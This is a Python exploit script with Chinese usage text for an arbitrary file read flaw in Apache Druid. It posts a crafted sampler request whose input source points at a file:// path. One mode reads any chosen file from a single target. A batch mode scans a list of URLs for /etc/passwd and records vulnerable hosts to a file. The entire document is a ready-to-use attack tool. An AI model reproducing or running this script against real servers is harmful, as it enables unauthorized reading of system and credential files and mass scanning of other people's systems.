import argparse
import sys

import requests
import json


def title():
    print('''
        攻击模式：python exp.py -t target_url -f file
        批量模式：python exp.py -s true -lf local_file
                Author:ying
        ''')


def format_url(url):
    try:
        if url[:4] != "http" and url[:5] != "https":
            url = "http://" + url
        elif url[:4] != "http":
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))


def attack(target_url, file, model=0):
    url = format_url(target_url)
    headers = {
        "Content-Type": "application/json"
    }
    data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "inputSource": {"type": "http", "uris":["file://{}".format(file)]}, "inputFormat": {"type": "regex", "pattern": "(.*)", "listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965", "columns": ["raw"]}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "1970-01-01T00:00:00Z"}, "dimensionsSpec": {}}, "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
    success = open("success.txt", "a")
    try:
        r = requests.post(url+"/druid/indexer/v1/sampler?for=connect", headers=headers, data=json.dumps(data), timeout=3)
        if "numRowsRead" in r.content.decode():
            print("[*] " + url + " success")
            if not model:
                print(r.content.decode())
            success.writelines(url+"\n")
            success.flush()
        else:
            print("[-] "+url)
    except Exception as e:
        if not model:
            print(e, "\n", "Error "+url)
        else:
            print("[-] "+url)


def scan(file):
    for url_link in open(file, 'r', encoding='utf-8'):
        if url_link.strip() != '':
            url_path = format_url(url_link.strip())
            attack(url_path, "/etc/passwd", model=1)


def main():
    parser = argparse.ArgumentParser(description='Apache Druid 任意文件读取')
    parser.add_argument('-t', '--target', type=str, help='目标URL')
    parser.add_argument('-s', '--scan', type=bool, help='批量模式')
    parser.add_argument('-f', '--file', type=str, help='要访问文件路径')
    parser.add_argument('-lf', '--local_file', type=str, help='本地文件路径')

    args = parser.parse_args()
    target_url = args.target
    local_file_url = args.local_file
    scan_model = args.scan
    file = args.file

    if target_url is not None and file is not None:
        attack(target_url, file)
    elif scan_model is True:
        scan(local_file_url)
    else:
        sys.exit(0)


if __name__ == '__main__':
    title()
    main()

